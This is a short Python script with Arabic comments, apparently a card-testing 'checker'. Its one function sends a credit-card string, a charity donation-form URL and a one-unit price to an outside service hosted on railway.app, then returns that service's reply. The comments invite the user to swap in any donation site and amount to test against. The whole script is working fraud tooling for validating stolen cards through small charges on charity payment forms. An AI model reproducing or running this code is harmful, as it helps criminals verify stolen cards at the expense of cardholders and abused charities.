import requests

def chkk(ccx):
    cc = ccx.strip()
    # هنا يجب تعديل الرابط حسب الموقع الذي تريد فحصه
    # مثلاً: https://brightercommunities.org/donate-form/
    urll = "https://heartsspeak.org/donate-form/"  # ضع الرابط الكامل
    price = "1"  # يمكن تغيير القيمة حسب المبلغ المطلوب
    res = requests.get(f'http://john-production.up.railway.app/pay?cc={cc}&url={urll}&price={price}').text
    return res
